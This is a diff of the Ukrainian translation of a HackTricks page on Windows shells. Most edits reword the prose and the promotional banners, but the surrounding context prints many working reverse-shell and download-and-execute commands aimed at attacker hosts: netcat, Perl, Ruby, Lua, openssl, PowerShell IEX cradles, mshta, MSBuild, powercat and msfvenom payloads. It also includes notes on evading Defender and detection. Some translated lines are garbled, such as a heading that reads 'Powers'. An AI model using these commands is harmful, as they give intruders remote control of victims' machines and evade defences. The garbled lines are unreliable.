@@ -1,18 +1,19 @@
 # Оболонки - Windows
 
+{% hint style="success" %}
+Вивчайте та практикуйте взлом AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте взлом GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Підтримайте HackTricks</summary>
 
-Інші способи підтримки HackTricks:
-
-* Якщо ви хочете побачити **рекламу вашої компанії на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub.**
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
 
 </details>
+{% endhint %}
 
 **Група з безпеки Try Hard**
 
@@ -24,8 +25,8 @@
 
 ## Lolbas
 
-Сторінка [lolbas-project.github.io](https://lolbas-project.github.io/) призначена для Windows, як [https://gtfobins.github.io/](https://gtfobins.github.io/) для Linux.\
-Очевидно, **в Windows немає файлів SUID або привілеїв sudo**, але корисно знати, **як** деякі **виконувані файли** можуть бути (зловживані), щоб виконати деякі неочікувані дії, наприклад **виконати довільний код.**
+Сторінка [lolbas-project.github.io](https://lolbas-project.github.io/) призначена для Windows, як [https://gtfobins.github.io/](https://gtfobins.github.io/) для linux.\
+Очевидно, **в Windows немає файлів SUID або привілеїв sudo**, але корисно знати, **як** деякі **виконувані файли** можуть бути (зловживані), щоб виконати деякі неочікувані дії, такі як **виконання довільного коду.**
 
 ## NC
 ```bash
@@ -33,7 +34,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) - це переносний та безпечний аналог Netcat**. Працює на системах подібних до Unix та Win32. З такими функціями, як потужне шифрування, виконання програм, налаштовані вихідні порти та постійне перепідключення, sbd надає універсальне рішення для TCP/IP-комунікації. Для користувачів Windows версію sbd.exe з дистрибутиву Kali Linux можна використовувати як надійну заміну Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) - це переносний та безпечний аналог Netcat**. Він працює на системах, схожих на Unix, та Win32. З такими функціями, як міцне шифрування, виконання програм, налаштовані вихідні порти та постійне перепідключення, sbd надає універсальне рішення для зв'язку TCP/IP. Для користувачів Windows версію sbd.exe з дистрибутиву Kali Linux можна використовувати як надійну заміну Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -52,35 +53,33 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 ```
 ## Perl
 
-Perl - це потужна мова програмування, яка часто використовується для створення шкідливих сценаріїв.
+Perl (Practical Extraction and Reporting Language) - це високорівнева, інтерпретована, загального призначення мова програмування. Perl широко використовується для розробки шелів на Windows платформі.
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
-
-### Ruby
-
-Ruby - це інтерпретована мова програмування, яка підтримує об'єктно-орієнтоване програмування.
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
 
-Lua - це легковага, високорівнева мова програмування, яка широко використовується для вбудовування в різноманітне програмне забезпечення та ігри. Lua може бути використана для створення скриптів, а також для розширення функціональності програм. Lua-скрипти можуть бути використані для автоматизації завдань або для створення нових функцій у програмах. Lua також широко використовується у галузі інформаційної безпеки для створення шкідливих програм та експлойтів.
+Lua - це легковага, високорівнева мова програмування, яка широко використовується для створення скриптів та розширення функціональності програм. Lua може бути використана для створення шкідливих сценаріїв та взаємодії з системою.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
 ## OpenSSH
 
-Атакувальник (Kali)
+Зловмисник (Kali)
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-Жертва
+### Жертва
+
+При взломі Windows-системи важливо встановити обмежені права жертви, щоб уникнути виявлення атаки.
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -90,7 +89,7 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 ```
 ## Powershell
 
-Powershell - це мова програмування та оболонка командного рядка, яка використовується для автоматизації завдань у середовищі Windows.
+## Повноваження
 ```bash
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
@@ -98,7 +97,7 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Процес, що виконує мережевий виклик: **powershell.exe**\
-Навантаження записане на диск: **НІ** (_принаймні ніде, де я шукав за допомогою procmon!_)
+Навантаження записане на диск: **НІ** (_принаймні ніде, де я міг знайти, використовуючи procmon!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -123,7 +122,7 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Приклад зворотньої оболонки hta-psh (використовуйте hta для завантаження та виконання PS backdoor)**
+#### **Приклад зворотньої оболонки hta-psh (використовуйте hta для завантаження та виконання PS задньої двері)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
@@ -311,7 +310,7 @@ impacket-smbserver -smb2support kali `pwd`
 
 ## **MSIExec**
 
-Атакуючий
+Зловмисник
 ```
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
@@ -350,7 +349,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Ви можете використати цю техніку, щоб обійти білістинг додатків та обмеження Powershell.exe. Вас буде запрошено на оболонку PS.\
+Ви можете використати цю техніку для обходу білого списку додатків та обмежень Powershell.exe. Оскільки вас буде запрошено ввести оболонку PS.\
 Просто завантажте це та виконайте: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
@@ -397,7 +396,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Почніть обслуговування скрипта на веб-сервері та виконайте його на стороні жертви:
+Почніть обслуговувати скрипт на веб-сервері та виконайте його на кінцевому пристрої жертви:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -409,15 +408,15 @@ Defender не виявляє його як зловмисний код (на д�
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-Завантажте, запустіть веб-сервер, запустіть слухача та виконайте його на кінці жертви:
+Завантажте, запустіть веб-сервер, запустіть слухача та виконайте його на кінцевому пристрої жертви:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender не виявляє його як зловмисний код (ще не 3/04/2019).
+Defender не виявляє його як зловмисний код (поки що, 3/04/2019).
 
 **Інші опції, запропоновані powercat:**
 
-Прив'язати оболонки, Зворотні оболонки (TCP, UDP, DNS), Перенаправлення портів, завантаження/завантаження, Генерування вантажів, Сервірування файлів...
+Прив'язка оболонок, Зворотня оболонка (TCP, UDP, DNS), Перенаправлення портів, завантаження/завантаження, Генерація вантажів, Сервірування файлів...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -438,17 +437,17 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Створіть запускач PowerShell, збережіть його у файлі, завантажте та виконайте.
+Створіть запускач powershell, збережіть його у файлі, завантажте та виконайте.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Виявлено як шкідливий код**
+**Виявлено як зловмісний код**
 
 ### MSF-Unicorn
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Створіть версію powershell зловмисного коду metasploit, використовуючи unicorn
+Створіть версію powershell задньої двері metasploit за допомогою unicorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -464,7 +463,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ## Більше
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) PS консоль з попередньо завантаженими деякими образливими PS модулями (шифрованими)\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) PS консоль з попередньо завантаженими деякими образливими PS модулями (зашифровано)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) PS консоль з деякими образливими PS модулями та виявленням проксі (IEX)
 
@@ -484,16 +483,17 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS консоль з деяк�
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+Навчайтесь та вправляйтесь в хакінгу AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Навчайтесь та вправляйтесь в хакінгу GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Підтримайте HackTricks</summary>
 
-Інші способи підтримки HackTricks:
-
-* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Отримайте [**офіційний PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Приєднуйтесь до** 💬 [**Групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github репозиторіїв.
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
 
 </details>
+{% endhint %}
